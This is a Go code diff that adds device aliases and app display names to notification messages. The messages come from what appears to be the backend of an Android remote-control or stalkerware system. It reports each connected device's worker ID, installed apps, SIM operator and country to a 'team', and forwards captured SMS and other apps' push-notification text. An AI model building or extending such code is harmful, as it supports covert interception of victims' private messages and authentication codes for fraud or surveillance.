@@ -342,8 +342,8 @@ func buildConnectNotification(teamID string, nl notifyLang, data map[string]stri
 	model := data["model"]
 	country := data["country"]
 
-	var androidVer, workerLogin string
-	db.DB.QueryRow("SELECT COALESCE(android_version,''), COALESCE(worker_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&androidVer, &workerLogin)
+	var androidVer, workerLogin, alias string
+	db.DB.QueryRow("SELECT COALESCE(android_version,''), COALESCE(worker_id,''), COALESCE(alias,'') FROM devices WHERE device_id = ?", deviceID).Scan(&androidVer, &workerLogin, &alias)
 
 	var appsJSON string
 	db.DB.QueryRow("SELECT COALESCE(apps_list, '[]') FROM devices WHERE device_id = ?", deviceID).Scan(&appsJSON)
@@ -353,9 +353,14 @@ func buildConnectNotification(teamID string, nl notifyLang, data map[string]stri
 	var sim1 string
 	db.DB.QueryRow("SELECT COALESCE(operator,'') FROM devices WHERE device_id = ?", deviceID).Scan(&sim1)
 
+	deviceLabel := deviceID
+	if alias != "" {
+		deviceLabel = alias + " (" + deviceID + ")"
+	}
+
 	var sb strings.Builder
 	sb.WriteString(nl.NewConnect + "\n\n")
-	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Device, deviceID))
+	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Device, deviceLabel))
 	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Model, model))
 	if androidVer != "" {
 		sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Android, androidVer))
@@ -438,11 +443,19 @@ func buildSMSNotification(nl notifyLang, data map[string]string) string {
 }
 
 func buildPushNotification(nl notifyLang, data map[string]string) string {
+	appName := data["app_name"]
+	if appName == "" {
+		appName = appDisplayName(data["package"], "")
+	}
+	deviceLabel := data["alias"]
+	if deviceLabel == "" {
+		deviceLabel = data["device_id"]
+	}
 	return fmt.Sprintf(
 		"%s\n\n%s: %s\n%s: %s\n\n📋 %s\n%s",
 		nl.PushNotif,
-		nl.Device, data["device_id"],
-		nl.App, data["package"],
+		nl.Device, deviceLabel,
+		nl.App, appName,
 		data["title"],
 		truncate(data["text"], 300),
 	)
